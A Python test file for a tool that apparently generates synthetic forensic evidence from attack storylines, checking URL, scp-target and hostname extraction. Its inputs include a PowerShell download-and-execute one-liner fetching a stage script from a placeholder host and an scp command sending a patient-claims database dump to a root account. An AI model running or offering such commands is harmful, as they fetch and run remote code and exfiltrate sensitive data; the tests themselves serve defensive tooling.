# Copyright (c) 2026 Cisco Systems, Inc. and its affiliates
# SPDX-License-Identifier: MIT

"""Tests for network evidence inferred from storyline commands."""

from types import SimpleNamespace

from evidenceforge.generation.engine.storyline import StorylineMixin
from evidenceforge.models.scenario import System


class TestStorylineCommandNetworks:
    def test_extract_http_url_from_powershell_download(self):
        url = StorylineMixin._extract_http_url(
            'powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('
            "'https://cdn.example.test/stage.ps1')\""
        )

        assert url == "https://cdn.example.test/stage.ps1"

    def test_extract_scp_target_from_remote_destination(self):
        target = StorylineMixin._extract_scp_target(
            "scp /tmp/patient_claims.sql.gz root@10.10.2.30:/var/tmp/",
            "linux",
        )

        assert target == "10.10.2.30"

    def test_resolve_storyline_network_target_matches_fqdn(self):
        engine = object.__new__(StorylineMixin)
        engine._ad_domain = "meridianhcs.local"
        engine.scenario = SimpleNamespace(
            environment=SimpleNamespace(
                systems=[
                    System(
                        hostname="APP-INT-01",
                        ip="10.10.2.30",
                        os="Ubuntu 22.04",
                        type="server",
                    )
                ]
            )
        )

        assert engine._resolve_storyline_network_target("APP-INT-01.meridianhcs.local") == (
            "10.10.2.30"
        )
